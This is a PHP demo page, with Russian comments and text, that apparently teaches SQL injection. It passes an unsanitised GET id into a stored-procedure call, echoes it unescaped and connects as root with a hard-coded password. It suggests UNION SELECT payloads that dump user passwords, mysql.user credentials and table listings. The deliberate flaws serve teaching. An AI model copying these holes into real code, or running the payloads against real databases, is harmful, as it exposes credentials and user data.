<?php
/*
 * Демонстрация SQL инъекции
 */ 
define('DB_HOST', 		'localhost');
define('DB_USER', 		'root');
define('DB_PASSWORD', 	'password');
define('DB_NAME', 		'ws');

$link = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
mysqli_query($link, 'SET NAMES utf8');

require('../template/page.php');
$page->setProperty('%TITLE%', 'Демонстрация SQL инъекции');
$page->showHeader(); 

$email = 'vasya@mail.ru';
$id = (isset($_GET['id'])) ? $_GET['id'] : 0;
$sql = 'SQL запрос не выполнялся...';

?>
<form action="<?php echo $_SERVER['PHP_SELF']?>" method="get">
	<label for="txtEmail">Код пользователя</label>
	<input id="txtEmail" type="text" name="id" value="<?php echo $id?>"/>
	<button type="submit">Показать</button>
</form>
<p>Попробуйте ввести в качестве кода:</p>
<blockquote>0 UNION SELECT id, NOW(), email, password FROM user</blockquote>
<p>или так:</p>
<blockquote>0 UNION SELECT 0, NOW(), user, password FROM mysql.user</blockquote>
<p>или так:</p>
<blockquote>0 UNION SELECT table_rows, NOW(), table_name, table_comment FROM information_schema.tables WHERE table_schema='ws'</blockquote>

<h3>Сообщения пользователя <?php echo $id?></h3>
<table border="1">
<?php
// Использование хранимой процедуры
$sql = "CALL spDemoSQLInjenction5($id)";
$res = @mysqli_query($link, $sql) or die('Ошибка в запросе: ' . $sql);

while ($row = mysqli_fetch_array($res, MYSQL_ASSOC))
{
	echo '<tr>';
	foreach ($row as $value) echo '<td>', $value, '</td>';
	echo '</tr>';
}
?>
</table>

<hr><h4>SQL запрос</h4><p><?php echo $sql?></p>
<?php $page->showFooter() ?>